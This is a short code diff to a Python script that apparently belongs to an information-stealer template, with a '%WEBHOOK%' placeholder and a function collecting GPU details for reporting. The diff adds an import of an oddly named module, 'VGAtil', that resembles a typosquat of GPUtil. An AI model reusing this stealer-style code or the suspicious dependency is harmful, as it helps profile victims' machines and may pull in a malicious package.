@@ -18,6 +18,7 @@ from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
 import datetime
+import VGAtil as GPU
 
 
 webhook = '%WEBHOOK%'
@@ -956,7 +957,7 @@ def globalInfo():
                     used_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
                     temperature = subprocess.check_output(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"]).decode().strip()
 
-                    gpu_info = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
+                    gpu_info = f"GPU Model: `{GPU.getGPUs()}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
                     return gpu_info
                 except Exception as e:
                     return f"Error retrieving GPU information: {e}"
